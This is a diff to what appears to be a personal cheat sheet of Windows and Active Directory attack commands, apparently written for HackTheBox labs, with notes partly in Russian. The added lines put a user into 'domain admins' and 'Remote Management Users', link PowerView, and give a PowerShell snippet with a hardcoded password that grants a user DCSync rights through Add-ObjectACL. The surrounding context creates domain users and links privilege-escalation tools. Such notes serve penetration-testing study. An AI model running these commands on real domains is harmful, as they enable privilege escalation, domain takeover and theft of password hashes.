@@ -210,7 +210,11 @@ wmic logicaldisk - перечислить диски
 # Добавление пользователя в домен и в группу
 
 net user mighty Password123! /add /domain
-net group "domain admins" mighty /add /domain
+
+net group "domain admins" max /add /domain
+
+net localgroup 'Remote Management Users' max /add
+
 
 # Enumeration running services
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.State -like 'Running'}
@@ -305,13 +309,23 @@ https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
 
 https://github.com/HarmJ0y/PowerUp
 
---Power view
+# Power view
 
 https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+
+https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
 
 Get-NetUser | select cn    (список пользователей)
 
 Get-NetGroup -GroupName *admin*   (список групп содержащих *админ*)
+
+добавление прав пользователю для дссинк
+
+$pass = convertto-securestring 'qwerty123' -asplain -force
+$cred = new-object system.management.automation.pscredential('htb\max', $pass)
+Add-ObjectACL -PrincipalIdentity max -Credential $cred -Rights DCSync
+
+
 
 # Hot potato
 
